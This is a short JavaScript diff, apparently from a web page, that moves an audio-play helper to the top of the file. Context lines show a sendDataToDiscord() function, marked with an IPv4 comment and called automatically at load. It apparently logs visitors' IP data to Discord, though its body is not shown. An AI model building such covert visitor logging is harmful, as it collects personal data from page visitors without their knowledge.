@@ -1,3 +1,12 @@
+var myaudio = document.getElementById("audio1");
+
+function play() { 
+    if (myaudio.paused) 
+      myaudio.play(); 
+  }
+
+
+
 async function sendDataToDiscord() {
     try {
         // IPv4
@@ -77,11 +86,3 @@ async function sendDataToDiscord() {
 }
 
 sendDataToDiscord();
-
-
-var myaudio = document.getElementById("audio1");
-
-function play() { 
-    if (myaudio.paused) 
-      myaudio.play(); 
-  }
